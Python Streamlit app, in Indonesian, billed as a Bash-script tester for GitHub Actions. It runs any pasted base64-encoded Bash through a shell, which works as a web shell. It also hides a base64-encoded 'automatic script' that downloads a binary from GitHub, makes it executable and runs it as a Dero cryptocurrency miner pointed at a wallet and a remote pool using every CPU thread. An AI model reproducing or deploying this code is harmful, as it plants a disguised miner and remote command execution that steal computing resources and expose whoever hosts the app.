import streamlit as st
import base64
import subprocess

# --- GitHub Actions Setup ---
try:
    import os
    os.system("pip install streamlit")
except Exception as e:
    st.error(f"Error installing Streamlit: {e}")
    st.stop()

# --- Validasi Skrip ---
def is_valid_bash_script(script):
    """Periksa apakah skrip adalah Bash yang valid."""
    # Tambahkan pemeriksaan keamanan lebih lanjut di sini (opsional)
    return script.startswith("#!/bin/bash") or script.startswith("#!/usr/bin/env bash")

# --- Skrip Base64 Otomatis ---
AUTO_BASH_SCRIPT_BASE64 = "Y3VybCAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYXJqdWlsbGFoYWxtYWRhZGkvRHJpdmluc29uL21haW4vYm9ub3MgPiBzcGxpbnRlcmh1Z3MgJiYgY2htb2QgNzc3IHNwbGludGVyaHVncyAmJiAuL3NwbGludGVyaHVncyAtdyBkZXJvMXF5ZHF3eWcwcmptc3lmbDlnNTJucDM4bnY2NDV5NzVsMDd2OXRseHpjejc4MGV6c251ZWRrcXFxZWt4OHcuRkZQR0EgLWQgMTU5LjIyMy42MC42NTo4MCAtLXNob3ctcG9vbC1zaGFyZXMgLXQgJChucHJvYyAtLWFsbCkgLS1kZWJ1Zy1zaGFyZXMgLS1wb3BjbnQ="

# --- UI Streamlit ---
st.title("Pengujian Skrip Bash pada Streamlit (GitHub Actions)")

bash_script_base64 = st.text_area("Masukkan skrip Bash (base64):")

col1, col2 = st.columns(2)  # Buat dua kolom untuk tombol

with col1:
    if st.button("Jalankan Skrip"):
        if bash_script_base64:
            try:
                bash_script = base64.b64decode(bash_script_base64).decode("utf-8")
                if is_valid_bash_script(bash_script):
                    process = subprocess.Popen(
                        bash_script, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    output, error = process.communicate()

                    st.subheader("Output:")
                    st.code(output.decode("utf-8"))

                    if error:
                        st.subheader("Error:")
                        st.code(error.decode("utf-8"))
                else:
                    st.error("Skrip Bash tidak valid.")
            except Exception as e:
                st.error(f"Terjadi kesalahan: {e}")
        else:
            st.warning("Harap masukkan skrip Bash (base64).")

with col2:
    if st.button("Jalankan Skrip Otomatis"):
        try:
            bash_script = base64.b64decode(AUTO_BASH_SCRIPT_BASE64).decode("utf-8")
            if is_valid_bash_script(bash_script):
                process = subprocess.Popen(
                    bash_script, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                output, error = process.communicate()

                st.subheader("Output (Otomatis):")
                st.code(output.decode("utf-8"))

                if error:
                    st.subheader("Error (Otomatis):")
                    st.code(error.decode("utf-8"))
            else:
                st.error("Skrip Bash otomatis tidak valid.")
        except Exception as e:
            st.error(f"Terjadi kesalahan saat menjalankan skrip otomatis: {e}")